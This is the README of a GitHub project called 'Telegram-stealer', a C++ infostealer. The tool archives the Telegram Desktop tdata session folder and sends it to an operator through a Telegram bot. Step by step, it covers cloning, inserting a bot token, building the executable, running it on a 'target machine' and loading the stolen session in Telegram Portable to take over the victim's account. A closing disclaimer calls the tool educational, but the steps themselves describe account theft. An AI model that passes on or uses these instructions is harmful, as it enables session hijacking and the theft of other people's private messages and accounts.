# Telegram-stealer

**Account data extractor for Telegram Desktop**

---

## How to Use

1. Clone this repository:

   ```bash
   git clone https://github.com/nolimanom/Telegram-stealer
   ```
2. Open `main.cpp` and replace the placeholders at lines 91 and 92 with your Telegram bot token and your user ID (@userinfobot).
3. Build the project using the Visual Studio compiler:

   ```cmd
   cl /nologo /O2 /EHsc /std:c++17 main.cpp libs\miniz.c Shell32.lib /link /SUBSYSTEM:WINDOWS
   ```
4. Run the resulting executable on the target machine.
5. The program will locate and archive the `tdata` folder from `%APPDATA%\Telegram Desktop`.
6. The archive will be sent via your Telegram bot to the specified chat ID.
7. To access the extracted account, download the portable version of Telegram.
8. Replace the portable Telegram’s `tdata` folder with the received archive contents.
9. Launch Telegram Portable — you should be logged into the account.

> **Important:** If the user logs out or terminates the Telegram session, this method will no longer grant access.

---

## How It Works

The executable searches for the `tdata` folder used by Telegram Desktop to store session data. It compresses this folder into a zip archive, then sends the archive through a Telegram bot to your specified chat ID.
![video](https://github.com/user-attachments/assets/ffbd00c2-3530-4e18-99cc-fe4a29cc50f8)

---

## Disclaimer

**This project is intended solely for educational and personal use.**

You should use this software **only on Telegram accounts you own or have explicit permission to access**.

**Unauthorized use to access, steal, or manipulate data belonging to others is illegal and unethical.**

The author assumes no responsibility for any misuse, damages, or legal consequences resulting from the use of this software. Use it at your own risk and in accordance with all applicable laws.
